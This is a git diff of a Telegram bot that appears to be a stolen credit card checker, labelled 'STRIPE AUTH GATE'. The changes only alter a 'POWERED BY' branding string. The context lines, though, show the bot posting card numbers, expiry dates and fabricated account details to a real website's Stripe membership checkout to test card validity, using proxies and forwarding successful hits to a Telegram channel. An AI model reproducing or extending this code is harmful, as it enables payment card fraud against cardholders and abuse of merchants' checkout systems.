@@ -134,7 +134,7 @@ async def ch(Client, message):
 ✘ TIME TAKEN: {get_time_taken(started_time)}'s
 
 ✘ CHECKED BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
-✘ POWERED BY: SPA4KY</b>"""
+✘ POWERED BY: S P A R K Y</b>"""
                                     await msg.edit_text(text)
                                     antidb.set(message.from_user.id, int(time.time()))
                                 elif 'id' not in json_first:
@@ -150,7 +150,7 @@ async def ch(Client, message):
 ✘ TIME TAKEN: {get_time_taken(started_time)}'s
 
 ✘ CHECKED BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
-✘ POWERED BY: SPA4KY</b>"""
+✘ POWERED BY: S P A R K Y</b>"""
                                     await msg.edit_text(text)
                                     antidb.set(message.from_user.id, int(time.time()))
                                 else:
@@ -167,7 +167,7 @@ async def ch(Client, message):
 ✘ TIME TAKEN: {get_time_taken(started_time)}'s
 
 ✘ CHECKED BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
-✘ POWERED BY: SPA4KY</b>"""
+✘ POWERED BY: S P A R K Y</b>"""
                                     await msg.edit_text(text)
                                     data = f"level=1&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&bemail={email}&bconfirmemail={email}&fullname=&gateway=stripe&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
                                     res = curl.post("https://www.voclr.it/membership-account/membership-checkout/",headers=headers,data=data)
@@ -183,7 +183,7 @@ async def ch(Client, message):
 ✘ TIME TAKEN: {get_time_taken(started_time)}'s
 
 ✘ CHECKED BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
- ✘ POWERED BY : SPA4KY</b>
+ ✘ POWERED BY : S P A R K Y</b>
  """
                                     await msg.edit_text(text)
                                     try:
@@ -257,7 +257,7 @@ async def ch(Client, message):
                                             await msg.edit_text("✖️ PROXY DEAD ✖️")
                                         else:
                                             lasttext = f"""
-<b>❇️ [STRIPE AUTH GATE] ❇️
+❇️ [STRIPE AUTH GATE] ❇️
 
 ✘ CARD: <code>{lista}</code>
 ✘ RESULT: {response}{r_logo} [{r_text}]
@@ -268,7 +268,7 @@ async def ch(Client, message):
 ✘ TIME TAKEN: {get_time_taken(started_time)}'s
 
 ✘ CHECKED BY: <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]
-✘ POWERED BY: SPA4KY</b>"""
+✘ POWERED BY: S P A R K Y"""
                                         await msg.edit_text(lasttext)
                                         if "✅" in lasttext:
                                             await Client.send_message(-1001752921824, lasttext)
